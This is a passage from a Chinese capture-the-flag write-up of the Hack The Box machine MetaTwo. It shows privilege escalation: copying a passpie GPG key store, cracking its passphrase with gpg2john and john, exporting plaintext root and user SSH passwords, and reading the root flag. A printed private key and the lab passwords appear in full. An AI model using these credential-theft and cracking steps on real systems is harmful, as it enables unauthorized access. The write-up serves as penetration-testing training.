BLOCK-----<br><br>lQUBBGK4V9YRDADENdPyGOxVM7hcLSHfXg+21dENGedjYV1gf9cZabjq6v440NA1<br>AiJBBC1QUbIHmaBrxngkbu/DD0gzCEWEr2pFusr/Y3yY4codzmteOW6Rg2URmxMD<br>/GYn9FIjUAWqnfdnttBbvBjseL4sECpmgxTIjKbWAXlqgEgNjXD306IweEy2FOho<br>3LpAXxfk8C/qUCKcpxaz0G2k0do4+VTKZ+5UDpqM5++soJqhCrUYudb9zyVyXTpT<br>ZjMvyXe5NeC7JhBCKh+/Wqc4xyBcwhDdW+WU54vuFUthn+PUubEN1m+s13BkyvHV<br>gNAM4v6terRItXdKvgvHtJxE0vhlNSjFAedACHC4sN+dRqFu4li8XPIVYGkuK9pX<br>5xA6Nj+8UYRoZrP4SYtaDslT63ZaLd2MvwP+xMw2XEv8Uj3TGq6BIVWmajbsqkEp<br>tQkU7d+nPt1aw2sA265vrIzry02NAhxL9YQGNJmXFbZ0p8cT3CswedP8XONmVdxb<br>a1UfdG+soO3jtQsBAKbYl2yF/+D81v+42827iqO6gqoxHbc/0epLqJ+Lbl8hC/sG<br>WIVdy+jynHb81B3FIHT832OVi2hTCT6vhfTILFklLMxvirM6AaEPFhxIuRboiEQw<br>8lQMVtA1l+Et9FXS1u91h5ZL5PoCfhqpjbFD/VcC5I2MhwL7n50ozVxkW2wGAPfh<br>cODmYrGiXf8dle3z9wg9ltx25XLsVjoR+VLm5Vji85konRVuZ7TKnL5oXVgdaTML<br>qIGqKLQfhHwTdvtYOTtcxW3tIdI16YhezeoUioBWY1QM5z84F92UVz6aRzSDbc/j<br>FJOmNTe7+ShRRAAPu2qQn1xXexGXY2BFqAuhzFpO/dSidv7/UH2+x33XIUX1bPXH<br>FqSg+11VAfq3bgyBC1bXlsOyS2J6xRp31q8wJzUSlidodtNZL6APqwrYNhfcBEuE<br>PnItMPJS2j0DG2V8IAgFnsOgelh9ILU/OfCA4pD4f8QsB3eeUbUt90gmUa8wG7uM<br>FKZv0I+r9CBwjTK3bg/rFOo+DJKkN3hAfkARgU77ptuTJEYsfmho84ZaR3KSpX4L<br>/244aRzuaTW75hrZCJ4RxWxh8vGw0+/kPVDyrDc0XNv6iLIMt6zJGddVfRsFmE3Y<br>q2wOX/RzICWMbdreuQPuF0CkcvvHMeZX99Z3pEzUeuPu42E6JUj9DTYO8QJRDFr+<br>F2mStGpiqEOOvVmjHxHAduJpIgpcF8z18AosOswa8ryKg3CS2xQGkK84UliwuPUh<br>S8wCQQxveke5/IjbgE6GQOlzhpMUwzih7+15hEJVFdNZnbEC9K/ATYC/kbJSrbQM<br>RfcJUrnjPpDFgF6sXQJuNuPdowc36zjE7oIiD69ixGR5UjhvVy6yFlESuFzrwyeu<br>TDl0UOR6wikHa7tF/pekX317ZcRbWGOVr3BXYiFPTuXYBiX4+VG1fM5j3DCIho20<br>oFbEfVwnsTP6xxG2sJw48Fd+mKSMtYLDH004SoiSeQ8kTxNJeLxMiU8yaNX8Mwn4<br>V9fOIdsfks7Bv8uJP/lnKcteZjqgBnXPN6ESGjG1cbVfDsmVacVYL6bD4zn6ZN/n<br>WP4HAwKQfLVcyzeqrf8h02o0Q7OLrTXfDw4sd/a56XWRGGeGJgkRXzAqPQGWrsDC<br>6/eahMAwMFbfkhyWXlifgtfdcQme2XSUCNWtF6RCEAbYm0nAtDNQYXNzcGllIChB<br>dXRvLWdlbmVyYXRlZCBieSBQYXNzcGllKSA8cGFzc3BpZUBsb2NhbD6IkAQTEQgA<br>OBYhBHxnhqdWG8hPUEhnHjh3dcNXRdIDBQJiuFfWAhsjBQsJCAcCBhUKCQgLAgQW<br>AgMBAh4BAheAAAoJEDh3dcNXRdIDRFQA/3V6S3ad2W9c1fq62+X7TcuCaKWkDk4e<br>qalFZ3bhSFVIAP4qI7yXjBXZU4+Rd+gZKp77UNFdqcCyhGl1GpAJyyERDZ0BXwRi<br>uFfWEAQAhBp/xWPRH6n+PLXwJf0OL8mXGC6bh2gUeRO2mpFkFK4zXE5SE0znwn9J<br>CBcYy2EePd5ueDYC9iN3H7BYlhAUaRvlU7732CY6Tbw1jbmGFLyIxS7jHJwd3dXT<br>+PyrTxF+odQ6aSEhT4JZrCk5Ef7/7aGMH4UcXuiWrgTPFiDovicAAwUD/i6Q+sq+<br>FZplPakkaWO7hBC8NdCWsBKIQcPqZoyoEY7m0mpuSn4Mm0wX1SgNrncUFEUR6pyV<br>jqRBTGfPPjwLlaw5zfV+r7q+P/jTD09usYYFglqJj/Oi47UVT13ThYKyxKL0nn8G<br>JiJHAWqExFeq8eD22pTIoueyrybCfRJxzlJV/gcDAsPttfCSRgia/1PrBxACO3+4<br>VxHfI4p2KFuza9hwok3jrRS7D9CM51fK/XJkMehVoVyvetNXwXUotoEYeqoDZVEB<br>J2h0nXerWPkNKRrrfYh4BBgRCAAgFiEEfGeGp1YbyE9QSGceOHd1w1dF0gMFAmK4<br>V9YCGwwACgkQOHd1w1dF0gOm5gD9GUQfB+Jx/Fb7TARELr4XFObYZq7mq/NUEC+P<br>o3KGdNgA/04lhPjdN3wrzjU3qmrLfo6KI+w2uXLaw+bIT1XZurDN<br>=7Uo6<br>-----END PGP PRIVATE KEY BLOCK-----<br>jnelson@meta2:~/.passpie$ <span class="hljs-built_in">cd</span> ssh/<br>jnelson@meta2:~/.passpie/ssh$ <span class="hljs-built_in">ls</span> -la<br>total 16<br>dr-xr-x--- 2 jnelson jnelson 4096 Oct 25  2022 .<br>dr-xr-x--- 3 jnelson jnelson 4096 Oct 25  2022 ..<br>-r-xr-x--- 1 jnelson jnelson  683 Oct 25  2022 jnelson.pass<br>-r-xr-x--- 1 jnelson jnelson  673 Oct 25  2022 root.pass<br>jnelson@meta2:~/.passpie/ssh$ <span class="hljs-built_in">cat</span> jnelson.pass <br>comment: <span class="hljs-string">&#x27;&#x27;</span><br>fullname: jnelson@ssh<br>login: jnelson<br>modified: 2022-06-26 08:58:15.514422<br>name: ssh<br>password: <span class="hljs-string">&#x27;-----BEGIN PGP MESSAGE-----</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">  hQEOA6I+wl+LXYMaEAP/eA8Bw+/AcAvm5g0QFotFRzmToYPSoUr13XcUSSmuEi0c</span><br><span class="hljs-string"></span><br><span class="hljs-string">  4zObpYX4PvSjB6YdhIIxu/cJNZV+WbUuTU0HZTPs49i8qe1xK+g4YRELqhSo6oig</span><br><span class="hljs-string"></span><br><span class="hljs-string">  ZuvQptZzB8LmG8zRVB6c1aO/1SoiRvzfGmgrdaHhtyGA2rtdTZU66MIzZ+irVhED</span><br><span class="hljs-string"></span><br><span class="hljs-string">  /Agw0T3BdpJ15yuNSmyfpf14PeE5r/dWBc6l4/VO6ZZzWyX8SysNxcFDSHChpXsm</span><br><span class="hljs-string"></span><br><span class="hljs-string">  7OR9hpt9HEVZiHq87qNwSYqiNeA9p7uzKV37HQpik3zQvtudc8Ho7IUdU1a5ZCWj</span><br><span class="hljs-string"></span><br><span class="hljs-string">  EmrNsSI0aEBKbJ47ZoX4jfwnjRO5QrDzNf1G9vkbzb2V0k0BtHWiok49YVRmLB63</span><br><span class="hljs-string"></span><br><span class="hljs-string">  GFD/CGo7s1dia+0PP6BNMo0dllqI72/8rGQcM0BFOqzhzKZ3/iNNKoJUiEHzIvMW</span><br><span class="hljs-string"></span><br><span class="hljs-string">  7ome0qtZhiFs+5J3I2U1HA==</span><br><span class="hljs-string"></span><br><span class="hljs-string">  =91YS</span><br><span class="hljs-string"></span><br><span class="hljs-string">  -----END PGP MESSAGE-----</span><br><span class="hljs-string"></span><br><span class="hljs-string">  &#x27;</span><br>jnelson@meta2:~/.passpie/ssh$ <span class="hljs-built_in">cat</span> root.pass <br>comment: <span class="hljs-string">&#x27;&#x27;</span><br>fullname: root@ssh<br>login: root<br>modified: 2022-06-26 08:58:15.621572<br>name: ssh<br>password: <span class="hljs-string">&#x27;-----BEGIN PGP MESSAGE-----</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2</span><br><span class="hljs-string"></span><br><span class="hljs-string">  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km</span><br><span class="hljs-string"></span><br><span class="hljs-string">  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED</span><br><span class="hljs-string"></span><br><span class="hljs-string">  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf</span><br><span class="hljs-string"></span><br><span class="hljs-string">  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg</span><br><span class="hljs-string"></span><br><span class="hljs-string">  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw</span><br><span class="hljs-string"></span><br><span class="hljs-string">  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr</span><br><span class="hljs-string"></span><br><span class="hljs-string">  lpF0RatbxQGWBks5F3o=</span><br><span class="hljs-string"></span><br><span class="hljs-string">  =uh1B</span><br><span class="hljs-string"></span><br><span class="hljs-string">  -----END PGP MESSAGE-----</span><br><span class="hljs-string"></span><br><span class="hljs-string">  &#x27;</span><br>jnelson@meta2:~/.passpie/ssh$ <br></code></pre></td></tr></table></figure>
+
+<p>28、通过查看手册发现，这个工具是可以直接命令使用的</p>
+<p><code>https://passpie.readthedocs.io/en/latest/</code></p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs elixir">jnelson<span class="hljs-variable">@meta2</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>passpie<br>╒════════╤═════════╤════════════╤═══════════╕<br>│ <span class="hljs-title class_">Name</span>   │ <span class="hljs-title class_">Login</span>   │ <span class="hljs-title class_">Password</span>   │ <span class="hljs-title class_">Comment</span>   │<br>╞════════╪═════════╪════════════╪═══════════╡<br>│ ssh    │ jnelson │ ********   │           │<br>├────────┼─────────┼────────────┼───────────┤<br>│ ssh    │ root    │ ********   │           │<br>╘════════╧═════════╧════════════╧═══════════╛<br>jnelson<span class="hljs-variable">@meta2</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span><br></code></pre></td></tr></table></figure>
+
+<p>29、然后我们把这个工具文件夹里的key都复制出来到本地</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">┌──(kali㉿offsec)-[~/<span class="hljs-title class_">Desktop</span>]<br>└─<span class="hljs-variable">$ </span>scp jnelson<span class="hljs-variable">@10</span>.<span class="hljs-number">10.11</span>.<span class="hljs-number">186</span><span class="hljs-symbol">:/home/jnelson/</span>.passpie/.keys . <br>jnelson<span class="hljs-variable">@10</span>.<span class="hljs-number">10.11</span>.<span class="hljs-number">186</span><span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">.keys                                                                                                                    100% 5243     5.2KB/s   00:00 </span><br></code></pre></td></tr></table></figure>
+
+<p>30、开始尝试破解</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs subunit">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ mv .keys keys <br><br>┌──(kali㉿offsec)-[~/Desktop]<br>└─$ gpg2john keys<br><br>File keys<br><span class="hljs-keyword">Error: </span>Ensure that the input file keys contains a single private key only.<br><span class="hljs-keyword">Error: </span>No hash was generated for keys, ensure that the input file contains a single private key only.<br></code></pre></td></tr></table></figure>
+
+<p><img src="http://sh1yan.top/photo/MetaTwo-htb-writeup/11.png" srcset="/img/loading.gif" lazyload></p>
+<p>31、这里需要把公钥部分给删除掉，只保留私钥的内容，进行转换</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ gpg2john keys<br><br>File keys<br>Passpie:<span class="hljs-variable">$gpg</span>$<span class="hljs-number">*17</span><span class="hljs-number">*54</span><span class="hljs-number">*3072</span><span class="hljs-number">*e975911867862609115f302a3d0196aec0c2ebf79a84c0303056df921c965e589f82d7dd71099ed9749408d5ad17a4421006d89b49c0</span><span class="hljs-number">*3</span><span class="hljs-number">*254</span><span class="hljs-number">*2</span><span class="hljs-number">*7</span><span class="hljs-number">*16</span><span class="hljs-number">*21d36a3443b38bad35df0f0e2c77f6b9</span><span class="hljs-number">*65011712</span><span class="hljs-number">*907cb55ccb37aaad</span>:::Passpie (Auto-generated by Passpie) &lt;passpie@local&gt;::keys<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">┌──(kali㉿offsec)-[~/Desktop]<br>└─<span class="hljs-symbol">$</span> gpg2john keys &gt; gpg.hash    <br><br><span class="hljs-keyword">File</span> keys<br></code></pre></td></tr></table></figure>
+
+<p>32、然后开始破解密码的值</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ sudo john -wordlist <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt gpg.hash --format=gpg<br><br>blink182         (Passpie)  <br></code></pre></td></tr></table></figure>
+
+<p>33、这里就破解出来密码了，然后我们通过 passpie 工具，将密码都导出来</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs scss">jnelson<span class="hljs-keyword">@meta</span>2:~$ passpie export passwd.txt<br><span class="hljs-attribute">Passphrase</span>: <br>jnelson<span class="hljs-keyword">@meta</span>2:~$ cat passwd.txt <br><span class="hljs-attribute">credentials</span>:<br>- <span class="hljs-attribute">comment</span>: <span class="hljs-string">&#x27;&#x27;</span><br>  <span class="hljs-attribute">fullname</span>: root<span class="hljs-keyword">@ssh</span><br>  <span class="hljs-attribute">login</span>: root<br>  <span class="hljs-attribute">modified</span>: <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">26</span> <span class="hljs-number">08</span>:<span class="hljs-number">58</span>:<span class="hljs-number">15.621572</span><br>  <span class="hljs-attribute">name</span>: ssh<br>  <span class="hljs-attribute">password</span>: !!python/unicode <span class="hljs-string">&#x27;p7qfAZt4_A1xo_0x&#x27;</span><br>- <span class="hljs-attribute">comment</span>: <span class="hljs-string">&#x27;&#x27;</span><br>  <span class="hljs-attribute">fullname</span>: jnelson<span class="hljs-keyword">@ssh</span><br>  <span class="hljs-attribute">login</span>: jnelson<br>  <span class="hljs-attribute">modified</span>: <span class="hljs-number">2022</span>-<span class="hljs-number">06</span>-<span class="hljs-number">26</span> <span class="hljs-number">08</span>:<span class="hljs-number">58</span>:<span class="hljs-number">15.514422</span><br>  <span class="hljs-attribute">name</span>: ssh<br>  <span class="hljs-attribute">password</span>: !!python/unicode <span class="hljs-string">&#x27;Cb4_JmWM8zUZWMu@Ys&#x27;</span><br><span class="hljs-attribute">handler</span>: passpie<br><span class="hljs-attribute">version</span>: <span class="hljs-number">1.0</span><br>jnelson<span class="hljs-keyword">@meta</span>2:~$<br></code></pre></td></tr></table></figure>
+
+<p>34、这里开始尝试下登录root账号</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tap">jnelson@meta2:~$ su root<br>Password: <br>root@meta2:/home/jnelson<span class="hljs-comment"># cd ~</span><br>root@meta2:~<span class="hljs-comment"># pwd</span><br>/root<br>root@meta2:~<span class="hljs-comment"># ls -la</span><br>total 28<br>drwx------ <span class="hljs-number"> 4 </span>root root<span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 23 </span>10:26 .<br>drwxr-xr-x<span class="hljs-number"> 18 </span>root root<span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 25 </span><span class="hljs-number"> 2022 </span>..<br>lrwxrwxrwx <span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 9 </span>Jun<span class="hljs-number"> 26 </span><span class="hljs-number"> 2022 </span>.bash_history -&gt; /dev/null<br>-rw-r--r-- <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 571 </span>Apr<span class="hljs-number"> 10 </span><span class="hljs-number"> 2021 </span>.bashrc<br>drwxr-xr-x <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 5 </span><span class="hljs-number"> 2022 </span>.local<br>-rw-r--r-- <span class="hljs-number"> 1 </span>root root <span class="hljs-number"> 161 </span>Jul <span class="hljs-number"> 9 </span><span class="hljs-number"> 2019 </span>.profile<br>drwxr-xr-x <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 5 </span><span class="hljs-number"> 2022 </span>restore<br>-rw-r----- <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 33 </span>Sep<span class="hljs-number"> 23 </span>10:26 root.txt<br>root@meta2:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>35、获取最终的flag信息</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@meta2</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># cat root.txt </span><br>b010b4973b48282a6bd8c92adabcf5f6<br>root<span class="hljs-variable">@meta2</span><span class="hljs-symbol">:~</span><span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+
+<h4 id="0x03-通关凭证展示"><a href="#0x03-通关凭证展示" class="headerlink" title="0x03 通关凭证展示"></a>0x03 通关凭证展示</h4><p><code>https://www.hackthebox.com/achievement/machine/1705469/504</code></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%89%93%E9%9D%B6%E8%AE%B0/" class="category-chain-item">打靶记</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/shooting-range/" class="print-no-link">#shooting-range</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>MetaTwo-htb-writeup</div>
+      <div>https://sh1yan.top/2024/09/23/MetaTwo-htb-writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>shiyan</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年9月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/09/24/Shoppy-htb-writeup/" title="Shoppy-htb-writeup">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Shoppy-htb-writeup</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/02/Active-Directory-Technical-Implementation-h4rithd-20240403/" title="活动目录-技术实现-h4rithd-2024.04.03版本">
+                        <span class="hidden-mobile">活动目录-技术实现-h4rithd-2024.04.03版本</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a  rel="nofollow noopener"><span>Copyrights &copy; 2016-2024</span></a> <i class="iconfont icon-love"></i> <a  rel="nofollow noopener"><span>shiyan</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
